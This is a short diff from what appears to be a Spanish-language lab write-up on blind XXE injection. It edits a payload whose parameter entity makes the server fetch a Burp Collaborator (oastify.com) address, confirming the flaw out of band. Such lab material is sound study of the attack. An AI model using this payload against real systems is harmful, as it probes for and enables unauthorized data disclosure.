@@ -65,7 +65,7 @@ Nos vamos a `Burpsuite Collaborator` y pulsamos en `Copy to clipboard`, este dom
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-	<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com"> %xxe; ]>
+	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com"> %xxe; ]>
 	<stockCheck>
 		<productId>
 			1
